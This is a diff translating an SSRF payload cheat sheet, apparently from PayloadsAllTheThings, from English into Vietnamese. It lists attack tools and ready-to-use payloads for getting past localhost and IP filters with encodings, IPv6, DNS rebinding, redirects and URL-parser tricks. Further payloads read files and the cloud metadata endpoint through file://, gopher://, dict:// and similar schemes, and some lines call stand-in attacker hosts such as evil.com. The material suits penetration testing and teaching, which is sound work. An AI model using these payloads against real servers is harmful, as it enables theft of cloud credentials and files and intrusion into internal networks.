@@ -1,26 +1,26 @@
-# Server-Side Request Forgery
+# Giả mạo Yêu cầu phía Máy chủ (Server-Side Request Forgery)
 
-> Server Side Request Forgery or SSRF is a vulnerability in which an attacker forces a server to perform requests on their behalf.
+> Server Side Request Forgery hay SSRF là một lỗ hổng bảo mật trong đó kẻ tấn công buộc máy chủ thực hiện các yêu cầu (request) thay mặt cho chúng.
 
-## Summary
+## Tóm tắt
 
-* [Tools](#tools)
-* [Methodology](#methodology)
-* [Bypassing Filters](#bypassing-filters)
-    * [Default Targets](#default-targets)
-    * [Bypass Localhost with IPv6 Notation](#bypass-localhost-with-ipv6-notation)
-    * [Bypass Localhost with a Domain Redirect](#bypass-localhost-with-a-domain-redirect)
-    * [Bypass Localhost with CIDR](#bypass-localhost-with-cidr)
-    * [Bypass Using Rare Address](#bypass-using-rare-address)
-    * [Bypass Using an Encoded IP Address](#bypass-using-an-encoded-ip-address)
-    * [Bypass Using Different Encoding](#bypass-using-different-encoding)
-    * [Bypassing Using a Redirect](#bypassing-using-a-redirect)
-    * [Bypass Using DNS Rebinding](#bypass-using-dns-rebinding)
-    * [Bypass Abusing URL Parsing Discrepancy](#bypass-abusing-url-parsing-discrepancy)
-    * [Bypass PHP filter_var() Function](#bypass-php-filter_var-function)
-    * [Bypass Using JAR Scheme](#bypass-using-jar-scheme)
-    * [Bypass Using TLD localhost](#bypass-using-tld-localhost)
-* [Exploitation via URL Scheme](#exploitation-via-url-scheme)
+* [Công cụ](#tools)
+* [Phương pháp](#methodology)
+* [Vượt qua bộ lọc](#bypassing-filters)
+    * [Mục tiêu mặc định](#default-targets)
+    * [Vượt qua Localhost bằng ký hiệu IPv6](#bypass-localhost-with-ipv6-notation)
+    * [Vượt qua Localhost bằng chuyển hướng tên miền](#bypass-localhost-with-a-domain-redirect)
+    * [Vượt qua Localhost bằng CIDR](#bypass-localhost-with-cidr)
+    * [Vượt qua bằng địa chỉ hiếm gặp](#bypass-using-rare-address)
+    * [Vượt qua bằng địa chỉ IP được mã hóa](#bypass-using-an-encoded-ip-address)
+    * [Vượt qua bằng các kiểu mã hóa khác nhau](#bypass-using-different-encoding)
+    * [Vượt qua bằng chuyển hướng (Redirect)](#bypassing-using-a-redirect)
+    * [Vượt qua bằng DNS Rebinding](#bypass-using-dns-rebinding)
+    * [Vượt qua bằng cách lợi dụng sự khác biệt khi phân tích URL](#bypass-abusing-url-parsing-discrepancy)
+    * [Vượt qua hàm filter_var() của PHP](#bypass-php-filter_var-function)
+    * [Vượt qua bằng JAR Scheme](#bypass-using-jar-scheme)
+    * [Vượt qua bằng TLD localhost](#bypass-using-tld-localhost)
+* [Khai thác qua URL Scheme](#exploitation-via-url-scheme)
     * [file://](#file)
     * [http://](#http)
     * [dict://](#dict)
@@ -29,33 +29,33 @@
     * [ldap://](#ldap)
     * [gopher://](#gopher)
     * [netdoc://](#netdoc)
-* [Blind Exploitation](#blind-exploitation)
-* [Upgrade to XSS](#upgrade-to-xss)
-* [Labs](#labs)
-* [References](#references)
+* [Khai thác mù (Blind Exploitation)](#blind-exploitation)
+* [Nâng cấp lên XSS](#upgrade-to-xss)
+* [Bài lab](#labs)
+* [Tài liệu tham khảo](#references)
 
-## Tools
+## Công cụ
 
-* [swisskyrepo/SSRFmap](https://github.com/swisskyrepo/SSRFmap) - Automatic SSRF fuzzer and exploitation tool
-* [tarunkant/Gopherus](https://github.com/tarunkant/Gopherus) - Generates gopher link for exploiting SSRF and gaining RCE in various servers
-* [In3tinct/See-SURF](https://github.com/In3tinct/See-SURF) - Python based scanner to find potential SSRF parameters
-* [teknogeek/SSRF-Sheriff](https://github.com/teknogeek/ssrf-sheriff) - Simple SSRF-testing sheriff written in Go
-* [assetnote/surf](https://github.com/assetnote/surf) - Returns a list of viable SSRF candidates
-* [dwisiswant0/ipfuscator](https://github.com/dwisiswant0/ipfuscator) - A blazing-fast, thread-safe, straightforward and zero memory allocations tool to swiftly generate alternative IP(v4) address representations in Go.
-* [Horlad/r3dir](https://github.com/Horlad/r3dir) - a redirection service designed to help bypass SSRF filters that do not validate the redirect location. Intergrated with Burp with help of Hackvertor tags
+* [swisskyrepo/SSRFmap](https://github.com/swisskyrepo/SSRFmap) - Công cụ dò lỗi (fuzzer) và khai thác SSRF tự động
+* [tarunkant/Gopherus](https://github.com/tarunkant/Gopherus) - Tạo liên kết gopher để khai thác SSRF và chiếm quyền RCE trên nhiều loại máy chủ khác nhau
+* [In3tinct/See-SURF](https://github.com/In3tinct/See-SURF) - Công cụ quét dựa trên Python để tìm các tham số có khả năng bị SSRF
+* [teknogeek/SSRF-Sheriff](https://github.com/teknogeek/ssrf-sheriff) - Công cụ kiểm thử SSRF đơn giản viết bằng Go
+* [assetnote/surf](https://github.com/assetnote/surf) - Trả về danh sách các ứng viên có khả năng bị SSRF
+* [dwisiswant0/ipfuscator](https://github.com/dwisiswant0/ipfuscator) - Công cụ cực nhanh, an toàn luồng (thread-safe), đơn giản và không cấp phát bộ nhớ, dùng để tạo nhanh các cách biểu diễn thay thế cho địa chỉ IP(v4) bằng Go.
+* [Horlad/r3dir](https://github.com/Horlad/r3dir) - dịch vụ chuyển hướng được thiết kế để giúp vượt qua các bộ lọc SSRF không kiểm tra vị trí chuyển hướng. Được tích hợp với Burp nhờ các tag Hackvertor
 
-## Methodology
+## Phương pháp
 
-SSRF is a security vulnerability that occurs when an attacker manipulates a server to make HTTP requests to an unintended location. This happens when the server processes user-provided URLs or IP addresses without proper validation.
+SSRF là một lỗ hổng bảo mật xảy ra khi kẻ tấn công thao túng máy chủ để thực hiện các yêu cầu HTTP tới một vị trí không mong muốn. Điều này xảy ra khi máy chủ xử lý URL hoặc địa chỉ IP do người dùng cung cấp mà không kiểm tra hợp lệ đúng cách.
 
-Common exploitation paths:
+Các hướng khai thác phổ biến:
 
-* Accessing Cloud metadata
-* Leaking files on the server
-* Network discovery, port scanning with the SSRF
-* Sending packets to specific services on the network, usually to achieve a Remote Command Execution on another server
+* Truy cập Cloud metadata
+* Rò rỉ tệp tin trên máy chủ
+* Dò tìm mạng, quét cổng (port scanning) thông qua SSRF
+* Gửi gói tin đến các dịch vụ cụ thể trên mạng, thường nhằm đạt được khả năng Thực thi Lệnh Từ xa (Remote Command Execution) trên một máy chủ khác
 
-**Example**: A server accepts user input to fetch a URL.
+**Ví dụ**: Một máy chủ nhận đầu vào từ người dùng để lấy dữ liệu từ một URL.
 
 ```py
 url = input("Enter URL:")
@@ -63,21 +63,21 @@ response = requests.get(url)
 return response
 ```
 
-An attacker supplies a malicious input:
+Kẻ tấn công cung cấp một đầu vào độc hại:
 
 ```ps1
 http://169.254.169.254/latest/meta-data/
 ```
 
-This fetches sensitive information from the AWS EC2 metadata service.
+Yêu cầu này lấy thông tin nhạy cảm từ dịch vụ metadata của AWS EC2.
 
-## Bypassing Filters
+## Vượt qua bộ lọc
 
-### Default Targets
+### Mục tiêu mặc định
 
-By default, Server-Side Request Forgery are used to access services hosted on `localhost` or hidden further on the network.
+Theo mặc định, Server-Side Request Forgery được dùng để truy cập các dịch vụ chạy trên `localhost` hoặc ẩn sâu hơn trong mạng nội bộ.
 
-* Using `localhost`
+* Dùng `localhost`
 
   ```powershell
   http://localhost:80
@@ -85,7 +85,7 @@ By default, Server-Side Request Forgery are used to access services hosted on `l
   https://localhost:443
   ```
 
-* Using `127.0.0.1`
+* Dùng `127.0.0.1`
 
   ```powershell
   http://127.0.0.1:80
@@ -93,7 +93,7 @@ By default, Server-Side Request Forgery are used to access services hosted on `l
   https://127.0.0.1:443
   ```
 
-* Using `0.0.0.0`
+* Dùng `0.0.0.0`
 
   ```powershell
   http://0.0.0.0:80
@@ -101,30 +101,30 @@ By default, Server-Side Request Forgery are used to access services hosted on `l
   https://0.0.0.0:443
   ```
 
-### Bypass Localhost with IPv6 Notation
+### Vượt qua Localhost bằng ký hiệu IPv6
 
-* Using unspecified address in IPv6 `[::]`
+* Dùng địa chỉ không xác định trong IPv6 `[::]`
 
     ```powershell
     http://[::]:80/
     ```
 
-* Using IPv6 loopback addres`[0000::1]`
+* Dùng địa chỉ loopback IPv6 `[0000::1]`
 
     ```powershell
     http://[0000::1]:80/
     ```
 
-* Using [IPv6/IPv4 Address Embedding](http://www.tcpipguide.com/free/t_IPv6IPv4AddressEmbedding.htm)
+* Dùng [Nhúng địa chỉ IPv6/IPv4](http://www.tcpipguide.com/free/t_IPv6IPv4AddressEmbedding.htm)
 
     ```powershell
     http://[0:0:0:0:0:ffff:127.0.0.1]
     http://[::ffff:127.0.0.1]
     ```
 
-### Bypass Localhost with a Domain Redirect
+### Vượt qua Localhost bằng chuyển hướng tên miền
 
-| Domain                       | Redirect to |
+| Tên miền                     | Chuyển hướng đến |
 |------------------------------|-------------|
 | localtest.me                 | `::1`       |
 | localh.st                    | `127.0.0.1` |
@@ -132,15 +132,15 @@ By default, Server-Side Request Forgery are used to access services hosted on `l
 | spoofed.redacted.oastify.com | `127.0.0.1` |
 | company.127.0.0.1.nip.io     | `127.0.0.1` |
 
-The service `nip.io` is awesome for that, it will convert any ip address as a dns.
+Dịch vụ `nip.io` rất hữu ích cho việc này, nó sẽ chuyển đổi bất kỳ địa chỉ IP nào thành một bản ghi DNS.
 
 ```powershell
 NIP.IO maps <anything>.<IP Address>.nip.io to the corresponding <IP Address>, even 127.0.0.1.nip.io maps to 127.0.0.1
 ```
 
-### Bypass Localhost with CIDR
+### Vượt qua Localhost bằng CIDR
 
-The IP range `127.0.0.0/8` in IPv4 is reserved for loopback addresses.
+Dải IP `127.0.0.0/8` trong IPv4 được dành riêng cho các địa chỉ loopback.
 
 ```powershell
 http://127.127.127.127
@@ -148,11 +148,11 @@ http://127.0.1.3
 http://127.0.0.0
 ```
 
-If you try to use any address in this range (127.0.0.2, 127.1.1.1, etc.) in a network, it will still resolve to the local machine
+Nếu bạn thử dùng bất kỳ địa chỉ nào trong dải này (127.0.0.2, 127.1.1.1, v.v.) trong một mạng, nó vẫn sẽ trỏ về máy cục bộ (local machine).
 
-### Bypass Using Rare Address
+### Vượt qua bằng địa chỉ hiếm gặp
 
-You can short-hand IP addresses by dropping the zeros
+Bạn có thể viết tắt địa chỉ IP bằng cách bỏ bớt các số 0
 
 ```powershell
 http://0/
@@ -160,9 +160,9 @@ http://127.1
 http://127.0.1
 ```
 
-### Bypass Using an Encoded IP Address
+### Vượt qua bằng địa chỉ IP được mã hóa
 
-* Decimal IP location
+* Vị trí IP dạng thập phân
 
     ```powershell
     http://2130706433/ = http://127.0.0.1
@@ -171,7 +171,7 @@ http://127.0.1
     http://2852039166/ = http://169.254.169.254
     ```
 
-* Octal IP: Implementations differ on how to handle octal format of IPv4.
+* IP dạng bát phân (Octal): Các cách triển khai khác nhau xử lý định dạng bát phân của IPv4 theo cách khác nhau.
 
     ```powershell
     http://0177.0.0.1/ = http://127.0.0.1
@@ -180,7 +180,7 @@ http://127.0.1
     http://q177.0.0.1/ = http://127.0.0.1
     ```
 
-* Hex IP
+* IP dạng thập lục phân (Hex)
 
     ```powershell
     http://0x7f000001 = http://127.0.0.1
@@ -188,65 +188,65 @@ http://127.0.1
     http://0xa9fea9fe = http://169.254.169.254
     ```
 
-### Bypass Using Different Encoding
+### Vượt qua bằng các kiểu mã hóa khác nhau
 
-* URL encoding: Single or double encode a specific URL to bypass blacklist
+* Mã hóa URL: Mã hóa đơn hoặc mã hóa kép một URL cụ thể để vượt qua danh sách đen (blacklist)
 
     ```powershell
     http://127.0.0.1/%61dmin
     http://127.0.0.1/%2561dmin
     ```
 
-* Enclosed alphanumeric: `①②③④⑤⑥⑦⑧⑨⑩⑪⑫⑬⑭⑮⑯⑰⑱⑲⑳⑴⑵⑶⑷⑸⑹⑺⑻⑼⑽⑾⑿⒀⒁⒂⒃⒄⒅⒆⒇⒈⒉⒊⒋⒌⒍⒎⒏⒐⒑⒒⒓⒔⒕⒖⒗⒘⒙⒚⒛⒜⒝⒞⒟⒠⒡⒢⒣⒤⒥⒦⒧⒨⒩⒪⒫⒬⒭⒮⒯⒰⒱⒲⒳⒴⒵ⒶⒷⒸⒹⒺⒻⒼⒽⒾⒿⓀⓁⓂⓃⓄⓅⓆⓇⓈⓉⓊⓋⓌⓍⓎⓏⓐⓑⓒⓓⓔⓕⓖⓗⓘⓙⓚⓛⓜⓝⓞⓟⓠⓡⓢⓣⓤⓥⓦⓧⓨⓩ⓪⓫⓬⓭⓮⓯⓰⓱⓲⓳⓴⓵⓶⓷⓸⓹⓺⓻⓼⓽⓾⓿`
+* Ký tự chữ-số được bao khung: `①②③④⑤⑥⑦⑧⑨⑩⑪⑫⑬⑭⑮⑯⑰⑱⑲⑳⑴⑵⑶⑷⑸⑹⑺⑻⑼⑽⑾⑿⒀⒁⒂⒃⒄⒅⒆⒇⒈⒉⒊⒋⒌⒍⒎⒏⒐⒑⒒⒓⒔⒕⒖⒗⒘⒙⒚⒛⒜⒝⒞⒟⒠⒡⒢⒣⒤⒥⒦⒧⒨⒩⒪⒫⒬⒭⒮⒯⒰⒱⒲⒳⒴⒵ⒶⒷⒸⒹⒺⒻⒼⒽⒾⒿⓀⓁⓂⓃⓄⓅⓆⓇⓈⓉⓊⓋⓌⓍⓎⓏⓐⓑⓒⓓⓔⓕⓖⓗⓘⓙⓚⓛⓜⓝⓞⓟⓠⓡⓢⓣⓤⓥⓦⓧⓨⓩ⓪⓫⓬⓭⓮⓯⓰⓱⓲⓳⓴⓵⓶⓷⓸⓹⓺⓻⓼⓽⓾⓿`
 
     ```powershell
     http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com
     ```
 
-* Unicode encoding: In some languages (.NET, Python 3) regex supports unicode by default. `\d` includes `0123456789` but also `๐๑๒๓๔๕๖๗๘๙`.
+* Mã hóa Unicode: Trong một số ngôn ngữ (.NET, Python 3), regex hỗ trợ Unicode theo mặc định. `\d` bao gồm `0123456789` nhưng cũng bao gồm cả `๐๑๒๓๔๕๖๗๘๙`.
 
-### Bypassing via ipv6 hostname
+### Vượt qua thông qua tên máy chủ (hostname) ipv6
 
-* in Linux /etc/hosts contain this line `::1   localhost ip6-localhost ip6-loopback` but work only if http server running in ipv6
+* Trong Linux, tệp /etc/hosts có chứa dòng `::1   localhost ip6-localhost ip6-loopback`, nhưng chỉ hoạt động nếu máy chủ http đang chạy trên ipv6
 
    ```powershell
    http://ip6-localhost = ::1
    http://ip6-loopback = ::1
    ```
 
-### Bypassing Using a Redirect
+### Vượt qua bằng chuyển hướng (Redirect)
 
-1. Create a page on a whitelisted host that redirects requests to the SSRF the target URL (e.g. 192.168.0.1)
-2. Launch the SSRF pointing to `vulnerable.com/index.php?url=http://redirect-server`
-3. You can use response codes [HTTP 307](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/307) and [HTTP 308](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/308) in order to retain HTTP method and body after the redirection.
+1. Tạo một trang trên host nằm trong danh sách trắng (whitelist) để chuyển hướng các yêu cầu tới URL mục tiêu của SSRF (ví dụ: 192.168.0.1)
+2. Kích hoạt SSRF trỏ tới `vulnerable.com/index.php?url=http://redirect-server`
+3. Bạn có thể dùng mã phản hồi [HTTP 307](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/307) và [HTTP 308](https://developer.mozilla.org/en-US/docs/Web/HTTP/Status/308) để giữ nguyên phương thức HTTP và phần thân (body) sau khi chuyển hướng.
 
-To perform redirects without hosting own redirect server or perform seemless redirect target fuzzing, use [Horlad/r3dir](https://github.com/Horlad/r3dir).
+Để thực hiện chuyển hướng mà không cần tự host một máy chủ chuyển hướng, hoặc để dò tìm mục tiêu chuyển hướng một cách liền mạch, hãy dùng [Horlad/r3dir](https://github.com/Horlad/r3dir).
 
-* Redirects to `http://localhost` with `307 Temporary Redirect` status code
+* Chuyển hướng đến `http://localhost` với mã trạng thái `307 Temporary Redirect`
 
     ```powershell
     https://307.r3dir.me/--to/?url=http://localhost
     ```
 
-* Redirects to `http://169.254.169.254/latest/meta-data/` with `302 Found` status code
+* Chuyển hướng đến `http://169.254.169.254/latest/meta-data/` với mã trạng thái `302 Found`
 
     ```powershell
     https://62epax5fhvj3zzmzigyoe5ipkbn7fysllvges3a.302.r3dir.me
     ```
 
-### Bypass Using DNS Rebinding
+### Vượt qua bằng DNS Rebinding
 
-Create a domain that change between two IPs.
+Tạo một tên miền thay đổi qua lại giữa hai địa chỉ IP.
 
-* [1u.ms](http://1u.ms) - DNS rebinding utility
+* [1u.ms](http://1u.ms) - Công cụ hỗ trợ DNS rebinding
 
-For example to rotate between `1.2.3.4` and `169.254-169.254`, use the following domain:
+Ví dụ để xoay vòng giữa `1.2.3.4` và `169.254-169.254`, dùng tên miền sau:
 
 ```powershell
 make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
 ```
 
-Verify the address with `nslookup`.
+Xác minh địa chỉ bằng `nslookup`.
 
 ```ps1
 $ nslookup make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
@@ -258,9 +258,9 @@ Name:   make-1.2.3.4-rebind-169.254-169.254-rr.1u.ms
 Address: 169.254.169.254
 ```
 
-### Bypass Abusing URL Parsing Discrepancy
+### Vượt qua bằng cách lợi dụng sự khác biệt khi phân tích URL
 
-[A New Era Of SSRF Exploiting URL Parser In Trending Programming Languages - Research from Orange Tsai](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)
+[Kỷ nguyên mới của SSRF - Khai thác lỗi phân tích URL trong các ngôn ngữ lập trình phổ biến - Nghiên cứu của Orange Tsai](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)
 
 ```powershell
 http://127.1.1.1:80\@127.2.2.2:80/
@@ -272,16 +272,16 @@ http:127.0.0.1/
 
 ![https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/Images/WeakParser.png?raw=true](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/Images/WeakParser.jpg?raw=true)
 
-Parsing behavior by different libraries: `http://1.1.1.1 &@2.2.2.2# @3.3.3.3/`.
+Hành vi phân tích của các thư viện khác nhau: `http://1.1.1.1 &@2.2.2.2# @3.3.3.3/`.
 
-* `urllib2` treats `1.1.1.1` as the destination
-* `requests` and browsers redirect to `2.2.2.2`
-* `urllib` resolves to `3.3.3.3`
-* Some parsers replace `http:127.0.0.1/` to `http://127.0.0.1/`
+* `urllib2` xem `1.1.1.1` là đích đến
+* `requests` và trình duyệt chuyển hướng đến `2.2.2.2`
+* `urllib` phân giải thành `3.3.3.3`
+* Một số bộ phân tích thay thế `http:127.0.0.1/` thành `http://127.0.0.1/`
 
-### Bypass PHP filter_var() Function
+### Vượt qua hàm filter_var() của PHP
 
-In PHP 7.0.25, `filter_var()` function with the parameter `FILTER_VALIDATE_URL` allows URL such as:
+Trong PHP 7.0.25, hàm `filter_var()` với tham số `FILTER_VALIDATE_URL` cho phép các URL như:
 
 * `http://test???test.com`
 * `0://evil.com:80;http://google.com:80/`
@@ -293,9 +293,9 @@ In PHP 7.0.25, `filter_var()` function with the parameter `FILTER_VALIDATE_URL` 
 ?>
 ```
 
-### Bypass Using TLD localhost
+### Vượt qua bằng TLD localhost
 
-There was a reserved tld called `.localhost`, it can accept arbiratry domains and resolves to the localhost ip, here is an example
+Từng có một tld dành riêng tên là `.localhost`, nó có thể chấp nhận các tên miền tùy ý và phân giải về địa chỉ localhost, đây là một ví dụ
 
 ```powershell
 $ ping PayloadsAllTheThings.localhost -c 1
@@ -307,9 +307,9 @@ PING PayloadsAllTheThings.localhost (::1) 56 data bytes
 rtt min/avg/max/mdev = 0.070/0.070/0.070/0.000 ms
 ```
 
-### Bypass Using JAR Scheme
+### Vượt qua bằng JAR Scheme
 
-This attack technique is fully blind, you won't see the result.
+Kỹ thuật tấn công này hoàn toàn mù (blind), bạn sẽ không thấy được kết quả.
 
 ```powershell
 jar:scheme://domain/path!/ 
@@ -318,11 +318,11 @@ jar:https://127.0.0.1!/
 jar:ftp://127.0.0.1!/
 ```
 
-## Exploitation via URL Scheme
+## Khai thác qua URL Scheme
 
 ### File
 
-Allows an attacker to fetch the content of a file on the server. Transforming the SSRF into a file read.
+Cho phép kẻ tấn công lấy nội dung của một tệp trên máy chủ. Biến SSRF thành lỗ hổng đọc tệp (file read).
 
 ```powershell
 file:///etc/passwd
@@ -331,7 +331,7 @@ file://\/\/etc/passwd
 
 ### HTTP
 
-Allows an attacker to fetch any content from the web, it can also be used to scan ports.
+Cho phép kẻ tấn công lấy bất kỳ nội dung nào từ web, cũng có thể dùng để quét cổng.
 
 ```powershell
 ssrf.php?url=http://127.0.0.1:22
@@ -343,7 +343,7 @@ ssrf.php?url=http://127.0.0.1:443
 
 ### Dict
 
-The DICT URL scheme is used to refer to definitions or word lists available using the DICT protocol:
+URL scheme DICT được dùng để tham chiếu đến các định nghĩa hoặc danh sách từ có sẵn thông qua giao thức DICT:
 
 ```powershell
 dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>
@@ -352,7 +352,7 @@ ssrf.php?url=dict://attacker:11111/
 
 ### SFTP
 
-A network protocol used for secure file transfer over secure shell
+Một giao thức mạng dùng để truyền tệp an toàn qua secure shell
 
 ```powershell
 ssrf.php?url=sftp://evil.com:11111/
@@ -360,7 +360,7 @@ ssrf.php?url=sftp://evil.com:11111/
 
 ### TFTP
 
-Trivial File Transfer Protocol, works over UDP
+Trivial File Transfer Protocol, hoạt động qua UDP
 
 ```powershell
 ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET
@@ -368,7 +368,7 @@ ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET
 
 ### LDAP
 
-Lightweight Directory Access Protocol. It is an application protocol used over an IP network to manage and access the distributed directory information service.
+Lightweight Directory Access Protocol. Đây là một giao thức ứng dụng được dùng qua mạng IP để quản lý và truy cập dịch vụ thông tin thư mục phân tán.
 
 ```powershell
 ssrf.php?url=ldap://localhost:11211/%0astats%0aquit
@@ -376,7 +376,7 @@ ssrf.php?url=ldap://localhost:11211/%0astats%0aquit
 
 ### Netdoc
 
-Wrapper for Java when your payloads struggle with "`\n`" and "`\r`" characters.
+Wrapper dành cho Java khi payload của bạn gặp khó khăn với các ký tự "`\n`" và "`\r`".
 
 ```powershell
 ssrf.php?url=netdoc:///etc/passwd
@@ -384,27 +384,27 @@ ssrf.php?url=netdoc:///etc/passwd
 
 ### Gopher
 
-The `gopher://` protocol is a lightweight, text-based protocol that predates the modern World Wide Web. It was designed for distributing, searching, and retrieving documents over the Internet.
+Giao thức `gopher://` là một giao thức nhẹ, dựa trên văn bản, có trước World Wide Web hiện đại. Nó được thiết kế để phân phối, tìm kiếm và truy xuất tài liệu qua Internet.
 
 ```ps1
 gopher://[host]:[port]/[type][selector]
 ```
 
-This scheme is very useful as it as be used to send data to TCP protocol.
+Scheme này rất hữu ích vì nó có thể được dùng để gửi dữ liệu tới giao thức TCP.
 
 ```ps1
 gopher://localhost:25/_MAIL%20FROM:<attacker@example.com>%0D%0A
 ```
 
-Refer to the SSRF Advanced Exploitation to explore the `gopher://` protocol deeper.
+Tham khảo phần Khai thác Nâng cao SSRF để tìm hiểu sâu hơn về giao thức `gopher://`.
 
-## Blind Exploitation
+## Khai thác mù (Blind Exploitation)
 
-> When exploiting server-side request forgery, we can often find ourselves in a position where the response cannot be read.
+> Khi khai thác server-side request forgery, chúng ta thường gặp tình huống không thể đọc được phản hồi trả về.
 
-Use an SSRF chain to gain an Out-of-Band output: [assetnote/blind-ssrf-chains](https://github.com/assetnote/blind-ssrf-chains)
+Sử dụng một chuỗi SSRF để lấy dữ liệu ra ngoài băng thông (Out-of-Band): [assetnote/blind-ssrf-chains](https://github.com/assetnote/blind-ssrf-chains)
 
-**Possible via HTTP(s)**:
+**Có thể thực hiện qua HTTP(s)**:
 
 * [Elasticsearch](https://github.com/assetnote/blind-ssrf-chains#elasticsearch)
 * [Weblogic](https://github.com/assetnote/blind-ssrf-chains#weblogic)
@@ -417,7 +417,7 @@ Use an SSRF chain to gain an Out-of-Band output: [assetnote/blind-ssrf-chains](h
 * [JBoss](https://github.com/assetnote/blind-ssrf-chains#jboss)
 * [Confluence](https://github.com/assetnote/blind-ssrf-chains#confluence)
 * [Jira](https://github.com/assetnote/blind-ssrf-chains#jira)
-* [Other Atlassian Products](https://github.com/assetnote/blind-ssrf-chains#atlassian-products)
+* [Các sản phẩm Atlassian khác](https://github.com/assetnote/blind-ssrf-chains#atlassian-products)
 * [OpenTSDB](https://github.com/assetnote/blind-ssrf-chains#opentsdb)
 * [Jenkins](https://github.com/assetnote/blind-ssrf-chains#jenkins)
 * [Hystrix Dashboard](https://github.com/assetnote/blind-ssrf-chains#hystrix)
@@ -425,33 +425,33 @@ Use an SSRF chain to gain an Out-of-Band output: [assetnote/blind-ssrf-chains](h
 * [Docker](https://github.com/assetnote/blind-ssrf-chains#docker)
 * [Gitlab Prometheus Redis Exporter](https://github.com/assetnote/blind-ssrf-chains#redisexporter)
 
-**Possible via Gopher**:
+**Có thể thực hiện qua Gopher**:
 
 * [Redis](https://github.com/assetnote/blind-ssrf-chains#redis)
 * [Memcache](https://github.com/assetnote/blind-ssrf-chains#memcache)
 * [Apache Tomcat](https://github.com/assetnote/blind-ssrf-chains#tomcat)
 
-## Upgrade to XSS
+## Nâng cấp lên XSS
 
-When the SSRF doesn't have any critical impact, the network is segmented and you can't reach other machine, the SSRF doesn't allow you to exfiltrate files from the server.
+Khi SSRF không gây tác động nghiêm trọng, mạng bị phân đoạn (segmented) khiến bạn không thể truy cập máy khác, và SSRF không cho phép bạn lấy tệp ra khỏi máy chủ.
 
-You can try to upgrade the SSRF to an XSS, by including an SVG file containing Javascript code.
+Bạn có thể thử nâng cấp SSRF thành XSS, bằng cách chèn một tệp SVG chứa mã Javascript.
 
 ```bash
 https://example.com/ssrf.php?url=http://brutelogic.com.br/poc.svg
 ```
 
-## Labs
+## Bài lab
 
-* [PortSwigger - Basic SSRF against the local server](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost)
-* [PortSwigger - Basic SSRF against another back-end system](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system)
-* [PortSwigger - SSRF with blacklist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter)
-* [PortSwigger - SSRF with whitelist-based input filter](https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter)
-* [PortSwigger - SSRF with filter bypass via open redirection vulnerability](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection)
+* [PortSwigger - SSRF cơ bản nhắm vào máy chủ cục bộ](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-localhost)
+* [PortSwigger - SSRF cơ bản nhắm vào một hệ thống backend khác](https://portswigger.net/web-security/ssrf/lab-basic-ssrf-against-backend-system)
+* [PortSwigger - SSRF với bộ lọc đầu vào dựa trên danh sách đen](https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter)
+* [PortSwigger - SSRF với bộ lọc đầu vào dựa trên danh sách trắng](https://portswigger.net/web-security/ssrf/lab-ssrf-with-whitelist-filter)
+* [PortSwigger - SSRF vượt bộ lọc qua lỗ hổng chuyển hướng mở (open redirection)](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection)
 * [Root Me - Server Side Request Forgery](https://www.root-me.org/en/Challenges/Web-Server/Server-Side-Request-Forgery)
-* [Root Me - Nginx - SSRF Misconfiguration](https://www.root-me.org/en/Challenges/Web-Server/Nginx-SSRF-Misconfiguration)
+* [Root Me - Nginx - Cấu hình sai SSRF](https://www.root-me.org/en/Challenges/Web-Server/Nginx-SSRF-Misconfiguration)
 
-## References
+## Tài liệu tham khảo
 
 * [A New Era Of SSRF - Exploiting URL Parsers - Orange Tsai - September 27, 2017](https://web.archive.org/web/20171219113122/https://www.youtube.com/watch?v=D1S-G8rJrEk)
 * [Blind SSRF on errors.hackerone.net - chaosbolt - June 30, 2018](https://web.archive.org/web/20180711141712/https://hackerone.com/reports/374737)
